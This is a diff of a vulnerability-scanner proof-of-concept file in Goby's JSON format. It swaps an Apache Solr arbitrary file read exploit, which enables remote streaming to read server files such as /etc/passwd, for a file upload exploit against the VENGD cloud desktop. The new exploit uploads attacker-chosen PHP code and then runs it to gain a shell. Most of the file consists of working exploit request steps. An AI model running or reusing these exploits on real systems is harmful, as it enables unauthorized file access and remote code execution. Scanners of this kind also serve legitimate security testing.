@@ -1,40 +1,74 @@
 {
-      "Name": "Apache Solr Arbitrary File Read",
-      "Level": "2",
-      "Tags": ["fileread"],
-      "GobyQuery": "app=\"Solr\"",
-      "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
-      "Product": "Apache Solr",
-      "Homepage": "https://solr.apache.org/",
-      "Author": "PeiQi",
-      "Impact": "<p>Read any file on the server</p>",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
+      "Name": "VENGD Arbitrary File Upload",
+      "Level": "3",
+      "Tags": [
+            "getshell"
       ],
-	  "HasExp": true,
-	  "ExpParams": [
-		{
-			"name": "file",
-			"type": "createSelect",
-			"value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
-			"show": ""
-			}
-	  ],
-	  "ExpTips": {
-		"Type": "",
-		"Content": ""
-	  },
+      "GobyQuery": "title=\"和信下一代云桌面VENGD\"",
+      "Description": "和信创天云桌面系统存在任意文件上传",
+      "Product": "VENGD",
+      "Homepage": "https://www.vesystem.com/products/3",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://blog.csdn.net/weixin_44146996/article/details/115611026"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "FileContent",
+                  "Type": "input",
+                  "Value": "&lt;?php phpinfo(); ?&gt;"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-                        "follow_redirect": true,
-                        "header": {},
+                        "method": "POST",
+                        "uri": "/Upload/upload_file.php?l=test",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n<?php\nprint \"{{{str1}}}\";\n?>\n------WebKitFormBoundaryfcKRltGv--",
+                        "set_variable": [
+                              "str1|rand|str|7",
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Upload/test/{{{r1}}}.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -51,24 +85,31 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "responseHeader",
+                                    "value": "{{{str1}}}",
                                     "bz": ""
                               }
                         ]
                   },
-                  "SetVariable": []
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
             }
       ],
-	  "ExploitSteps": [
+      "ExploitSteps": [
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+                        "method": "POST",
+                        "uri": "/Upload/upload_file.php?l=test",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n{{{FileContent}}}\n------WebKitFormBoundaryfcKRltGv--",
+                        "set_variable": [
+                              "r1|rand|int|8"
+                        ]
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -80,57 +121,22 @@
                                     "operation": "==",
                                     "value": "200",
                                     "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "responseHeader",
-                                    "bz": ""
                               }
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
+                        "output|lastbody|regex|"
                   ]
             },
             {
                   "Request": {
-                        "method": "POST",
-                        "set_variable":["solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","],
-                        "uri": "/solr/{{{solrCore}}}/config",
+                        "method": "GET",
+                        "uri": "/Upload/test/{{{r1}}}.php",
                         "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/json"
-                        },
+                        "header": null,
                         "data_type": "text",
-                        "data": "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": []
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "uri": "/solr/{{{solrCore}}}/debug/dump?param=ContentStreams",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        "data_type": "text",
-                        "data": "stream.url=file://{{{file}}}"
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -146,10 +152,10 @@
                         ]
                   },
                   "SetVariable": [
-                  "output|lastbody|regex|(?s)\"stream\":\"(.*)\"}]"
+                        "output|define|text|/Upload/test/{{{r1}}}.php"
                   ]
             }
       ],
-      "PostTime": "2021-03-27 17:17:15",
-      "GobyVersion": "1.8.254"
+      "PostTime": "2021-12-09 13:55:04",
+      "GobyVersion": "1.9.310"
 }
